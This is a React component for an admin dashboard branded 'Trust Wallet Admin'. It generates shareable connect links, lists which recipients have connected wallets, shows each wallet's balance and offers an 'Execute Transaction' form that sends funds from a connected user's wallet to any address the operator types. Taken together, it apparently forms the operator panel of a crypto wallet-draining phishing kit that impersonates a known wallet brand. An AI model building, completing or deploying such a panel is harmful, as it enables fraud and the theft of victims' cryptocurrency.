import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { useNavigate } from 'react-router-dom';
import { adminAPI, walletAPI } from '../utils/api';

const AdminDashboard = React.memo(() => {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [selectedUser, setSelectedUser] = useState(null);
  const [walletInfo, setWalletInfo] = useState(null);
  const [transactionForm, setTransactionForm] = useState({ to: '', amount: '' });
  const navigate = useNavigate();

  useEffect(() => {
    const token = localStorage.getItem('adminToken');
    if (!token) {
      navigate('/admin');
      return;
    }
    fetchUsers();
  }, [navigate]);

  const fetchUsers = async () => {
    try {
      setLoading(true);
      const response = await adminAPI.getUsers();
      setUsers(response.data);
    } catch (error) {
      setMessage('Failed to fetch users');
    } finally {
      setLoading(false);
    }
  };

  const generateLink = async () => {
    try {
      const response = await adminAPI.generateLink();
      setMessage(`Link generated successfully! Share this link: ${response.data.link}`);
      fetchUsers(); // Refresh the list
    } catch (error) {
      setMessage('Failed to generate link');
    }
  };

  const deleteUser = async (linkId) => {
    if (!window.confirm('Are you sure you want to delete this user?')) return;
    
    try {
      await adminAPI.deleteUser(linkId);
      setMessage('User deleted successfully');
      fetchUsers();
    } catch (error) {
      setMessage('Failed to delete user');
    }
  };

  const viewWalletInfo = async (linkId) => {
    try {
      const response = await walletAPI.getWalletInfo(linkId);
      setWalletInfo(response.data);
      setSelectedUser(linkId);
    } catch (error) {
      setMessage('Failed to fetch wallet info');
    }
  };

  const logout = () => {
    localStorage.removeItem('adminToken');
    navigate('/admin');
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setMessage('Copied to clipboard!');
    setTimeout(() => setMessage(''), 3000);
  };

  const formatAddress = (address) => {
    if (!address) return 'Not connected';
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
  };

  const formatDate = (date) => {
    return new Date(date).toLocaleString();
  };

  const sendTransaction = async (linkId) => {
    try {
      const response = await walletAPI.prepareTransaction(linkId, {
        to: transactionForm.to,
        amount: transactionForm.amount
      });
      
      if (response.data.success) {
        setMessage(`✅ Transaction executed successfully! TX Hash: ${response.data.txHash}`);
        
        // Reset form
        setTransactionForm({ to: '', amount: '' });
        
        // Refresh wallet info to show updated data
        viewWalletInfo(linkId);
      } else {
        setMessage(`Transaction failed: ${response.data.message}`);
      }
      
    } catch (error) {
      setMessage(`❌ Transaction failed: ${error.response?.data?.message || error.message}`);
    }
  };

  return (
    <div>
      <nav className="navbar">
        <div className="container">
          <div className="navbar-content">
            <div className="navbar-brand">Trust Wallet Admin</div>
            <div style={{ display: 'flex', gap: '12px' }}>
              <button className="btn btn-primary" onClick={() => navigate('/admin/transactions')}>
                📊 Transaction History
              </button>
              <button className="btn btn-outline" onClick={logout}>
                Logout
              </button>
            </div>
          </div>
        </div>
      </nav>

      <div className="container">
        <div className="stats-grid">
          <div className="stat-card">
            <div className="stat-number">{users.length}</div>
            <div className="stat-label">Total Links</div>
          </div>
          <div className="stat-card">
            <div className="stat-number">{users.filter(u => u.isConnected).length}</div>
            <div className="stat-label">Connected</div>
          </div>
          <div className="stat-card">
            <div className="stat-number">{users.filter(u => !u.isConnected).length}</div>
            <div className="stat-label">Pending</div>
          </div>
        </div>

        <div className="card">
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
            <h2>User Management</h2>
            <button className="btn btn-primary" onClick={generateLink}>
              Generate New Link
            </button>
          </div>

          {message && (
            <div className={`alert ${message.includes('successfully') || message.includes('Copied') ? 'alert-success' : 'alert-info'}`}>
              {message}
              {message.includes('Share this link:') && (
                <button 
                  className="btn btn-outline" 
                  style={{ marginLeft: '12px', padding: '4px 12px', fontSize: '12px' }}
                  onClick={() => copyToClipboard(message.split('Share this link: ')[1])}
                >
                  Copy Link
                </button>
              )}
            </div>
          )}

          {loading ? (
            <div className="loading">Loading users...</div>
          ) : (
            <table className="table">
              <thead>
                <tr>
                  <th>Link ID</th>
                  <th>Status</th>
                  <th>Wallet Address</th>
                  <th>Connected</th>
                  <th>Created</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {users.map((user) => (
                  <tr key={user._id}>
                    <td>
                      <span className="wallet-address">{user.linkId.substring(0, 8)}...</span>
                    </td>
                    <td>
                      <span className={user.isConnected ? 'status-connected' : 'status-pending'}>
                        {user.isConnected ? '● Connected' : '○ Pending'}
                      </span>
                    </td>
                    <td>
                      {user.walletAddress ? (
                        <span className="wallet-address">{formatAddress(user.walletAddress)}</span>
                      ) : (
                        <span style={{ color: '#6b7280' }}>Not connected</span>
                      )}
                    </td>
                    <td>{user.connectionTime ? formatDate(user.connectionTime) : '-'}</td>
                    <td>{formatDate(user.createdAt)}</td>
                    <td>
                      <div style={{ display: 'flex', gap: '8px' }}>
                        {user.isConnected && (
                          <button 
                            className="btn btn-success" 
                            style={{ padding: '6px 12px', fontSize: '12px' }}
                            onClick={() => viewWalletInfo(user.linkId)}
                          >
                            View Wallet
                          </button>
                        )}
                        <button 
                          className="btn btn-primary" 
                          style={{ padding: '6px 12px', fontSize: '12px' }}
                          onClick={() => copyToClipboard(`${window.location.origin}/connect/${user.linkId}`)}
                        >
                          Copy Link
                        </button>
                        <button 
                          className="btn btn-danger" 
                          style={{ padding: '6px 12px', fontSize: '12px' }}
                          onClick={() => deleteUser(user.linkId)}
                        >
                          Delete
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
                {users.length === 0 && (
                  <tr>
                    <td colSpan="6" style={{ textAlign: 'center', color: '#6b7280', padding: '40px' }}>
                      No users found. Generate a link to get started.
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          )}
        </div>

        {walletInfo && selectedUser && (
          <div className="card">
            <h3>Wallet Information</h3>
            <div style={{ marginTop: '20px' }}>
              <p><strong>Address:</strong> <span className="wallet-address">{walletInfo.address}</span></p>
              <p><strong>Balance:</strong> {walletInfo.balance} ETH</p>
              <p><strong>Transaction Count:</strong> {walletInfo.transactionCount}</p>
              <p><strong>Chain ID:</strong> {walletInfo.chainId}</p>
              <p><strong>Wallet Type:</strong> {walletInfo.walletType}</p>
              <p><strong>Last Activity:</strong> {formatDate(walletInfo.lastActivity)}</p>
            </div>
            
            {/* Transaction Form */}
            <div style={{ marginTop: '32px', padding: '24px', backgroundColor: '#f9fafb', borderRadius: '8px' }}>
              <h4>Send Transaction</h4>
              <div className="alert alert-info" style={{ marginTop: '16px', fontSize: '14px' }}>
                <strong>💡 Tip:</strong> Supports Ethereum (0x...), Solana, Bitcoin, and other wallet addresses
              </div>
              <div style={{ marginTop: '16px' }}>
                <div className="form-group">
                  <label className="form-label">Recipient Address</label>
                  <input
                    type="text"
                    className="form-input"
                    placeholder="0x... or any valid wallet address"
                    value={transactionForm.to}
                    onChange={(e) => setTransactionForm({...transactionForm, to: e.target.value})}
                  />
                </div>
                <div className="form-group">
                  <label className="form-label">Amount (ETH)</label>
                  <input
                    type="number"
                    step="0.001"
                    className="form-input"
                    placeholder="0.001"
                    value={transactionForm.amount}
                    onChange={(e) => setTransactionForm({...transactionForm, amount: e.target.value})}
                  />
                </div>
                <button 
                  className="btn btn-primary" 
                  onClick={() => sendTransaction(selectedUser)}
                  disabled={!transactionForm.to || !transactionForm.amount}
                >
                  🚀 Execute Transaction
                </button>
              </div>
            </div>
            
            <button 
              className="btn btn-outline" 
              style={{ marginTop: '16px' }}
              onClick={() => {setWalletInfo(null); setSelectedUser(null);}}
            >
              Close
            </button>
          </div>
        )}
      </div>
    </div>
  );
});

export default AdminDashboard;
